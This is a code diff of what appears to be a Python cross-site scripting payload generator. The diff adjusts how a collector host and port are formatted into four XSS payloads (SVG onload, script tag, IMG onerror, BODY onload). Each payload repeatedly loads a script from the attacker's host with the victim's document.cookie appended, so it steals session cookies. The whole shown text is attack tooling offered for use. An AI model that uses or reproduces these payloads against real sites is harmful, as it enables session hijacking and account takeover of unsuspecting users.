@@ -67,13 +67,13 @@ if len(target) > 0 and gene:
 
     source = "{0}".format(target)
 else:
-    source = "{0}:{1}".format(host, port)
+    source = "//{0}:{1}".format(host, port)
     
 payload = '''
-    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)>
-    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)</script>
-    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)>
-    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?".concat(document.cookie)}},1010)></body>
+    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}?".concat(document.cookie)}},1010)>
+    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)</script>
+    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)>
+    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}/?".concat(document.cookie)}},1010)></body>
     '''.format(source)
 
         
